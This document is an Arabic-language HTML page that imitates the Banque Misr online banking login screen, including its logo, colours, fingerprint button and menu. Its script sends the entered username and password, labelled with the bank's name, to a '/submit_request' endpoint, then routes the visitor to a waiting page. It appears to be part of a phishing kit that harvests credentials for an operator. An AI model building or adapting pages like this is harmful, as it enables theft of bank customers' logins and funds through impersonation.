<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك مصر - تسجيل الدخول</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; }
        
        .header {
            background: linear-gradient(to bottom, #8b1e1e, #b01c1c);
            padding: 40px 20px 60px;
            text-align: center;
            position: relative;
            border-bottom-left-radius: 50% 20px;
            border-bottom-right-radius: 50% 20px;
        }
        .header img { height: 50px; }
        .top-icons { position: absolute; top: 20px; width: 100%; left: 0; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
        .top-icons i, .top-icons span { color: white; font-size: 18px; }
        
        .login-card {
            background: white;
            margin: -40px 20px 20px;
            padding: 30px 20px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        .welcome-text { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 25px; }
        
        .form-group { margin-bottom: 20px; position: relative; }
        .form-control {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            text-align: right;
            font-size: 16px;
            background: #f9f9f9;
        }
        .password-toggle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #999; }
        
        .forgot-link { display: block; text-align: right; color: #666; font-size: 14px; margin-bottom: 25px; text-decoration: none; }
        
        .btn-container { display: flex; gap: 10px; margin-bottom: 20px; }
        .btn-login { flex: 2; background: #e9a1a1; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 16px; }
        .btn-fingerprint { flex: 1; background: #b01c1c; color: white; border: none; padding: 12px; border-radius: 8px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: bold; }
        
        .btn-register { width: 100%; border: 1px solid #b01c1c; color: #b01c1c; background: white; padding: 12px; border-radius: 8px; font-weight: bold; margin-bottom: 20px; }
        
        .book-visit { color: #b01c1c; font-size: 14px; text-decoration: none; font-weight: bold; }
        
        .footer-nav { margin-top: auto; display: flex; justify-content: space-around; padding: 20px; background: white; border-top: 1px solid #eee; }
        .footer-item { text-align: center; color: #666; font-size: 12px; }
        .footer-item i { display: block; font-size: 20px; margin-bottom: 5px; color: #333; }
        
        #errorMessage { color: #d32f2f; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="top-icons">
            <i class="far fa-bell"></i>
            <span>English</span>
        </div>
        <img src="images/bm_logo.png" alt="Banque Misr">
    </div>

    <div class="login-card">
        <div class="welcome-text">مرحباً بكم في بنك مصر</div>
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="username" class="form-control" placeholder="اسم المستخدم" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" class="form-control" placeholder="كلمة المرور" required>
                <i class="far fa-eye-slash password-toggle" onclick="togglePassword()"></i>
            </div>
            <a href="#" class="forgot-link">نسيت اسم المستخدم/ كلمة المرور؟</a>
            
            <div id="errorMessage"></div>
            
            <div class="btn-container">
                <button type="submit" class="btn-login">تسجيل الدخول</button>
                <button type="button" class="btn-fingerprint">
                    <i class="fas fa-fingerprint"></i>
                    البصمة
                </button>
            </div>
            
            <div style="color: #999; margin-bottom: 20px;">أو</div>
            
            <button type="button" class="btn-register">سجل الآن</button>
            
            <a href="#" class="book-visit">تحتاج إلى زيارة الفرع؟ احجز الآن</a>
        </form>
    </div>

    <div class="footer-nav">
        <div class="footer-item"><i class="fas fa-layer-group"></i>منتجاتنا</div>
        <div class="footer-item"><i class="fas fa-map-marker-alt"></i>أقرب فرع</div>
        <div class="footer-item"><i class="fas fa-percent"></i>العروض</div>
        <div class="footer-item"><i class="fas fa-coins"></i>أسعار العملة</div>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const bankData = localStorage.getItem('selectedBankData');
            if (bankData) {
                try {
                    const bank = JSON.parse(bankData);
                    // You can use bank data here if needed
                } catch (e) {
                    console.error('Error parsing bank data:', e);
                }
            }
        });

        function togglePassword() {
            const pwd = document.getElementById("password");
            const icon = document.querySelector(".password-toggle");
            if (pwd.type === "password") {
                pwd.type = "text";
                icon.classList.replace("fa-eye-slash", "fa-eye");
            } else {
                pwd.type = "password";
                icon.classList.replace("fa-eye", "fa-eye-slash");
            }
        }

        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const errorDiv = document.getElementById("errorMessage");

            try {
                const response = await fetch("/submit_request", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        type: "login",
                        data: { bank: "Banque Misr", username: username, password: password }
                    })
                });
                const result = await response.json();
                if (result.status === "pending") {
                    localStorage.setItem("request_id", result.request_id);
                    window.location.href = "loading.html";
                } else {
                    errorDiv.textContent = result.message || "حدث خطأ.";
                    errorDiv.style.display = "block";
                }
            } catch (err) {
                errorDiv.textContent = "خطأ في الاتصال.";
                errorDiv.style.display = "block";
            }
        });
    </script>
</body>
</html>
